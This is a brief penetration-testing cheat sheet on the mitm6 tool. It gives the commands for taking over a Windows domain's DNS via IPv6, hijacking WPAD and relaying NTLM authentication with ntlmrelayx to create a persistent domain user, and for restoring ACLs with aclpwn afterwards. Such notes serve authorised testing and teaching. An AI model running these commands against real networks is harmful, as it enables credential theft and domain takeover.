# mitm6

This tool helps exploit default configuration of Windows to take over default DNS server. This tool is designed to work
with `impacket-ntlmrelayx`.

```bash
sudo mitm6 -d DOMAIN
```

## IPv6 DNS takeover

### Information:

**WPAD (Windows Proxy AutoDiscovery) service** is one that any system in domain sends data to proxy to DC. This happens
when a Windows system is rebooted, sends out a broadcast message to identify the WPAD service IP. Using `ntlmrelayx` we
can host a fake WPAD service and hijack all requests. When a user attempts to connect to DC, it receives the NTLMv2
Hash, proxies to DC which successfully authenticates via the challenge-response and and `ntlmrelayx` on successful
exploitaion, will create a new user within the domain to establish persistence.

```bash
sc query winhttpautoproxysvc
SERVICE_NAME: winhttpautoproxysvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```bash
# to perform MiTM
sudo mitm6 -d DOMAIN

$ sudo impacket-ntlmrelayx -6 -t [ldaps://DC_IP] -wh [fake-wpad.DOMAIN] -l [LOOT_DIR]
# successful will create a user on domain
# generates a .restore file to restore ACL.
```

### Restore using aclpwn

```bash
# pip3 install aclpwn
aclpwn -d DOMAIN --restore .RESTORE_FILE [-u USER] [-p PASS] [-dry]
```

## DNS takeover using delegate access

* [dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

## Additional Reading

* [blog.fox-it.com/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)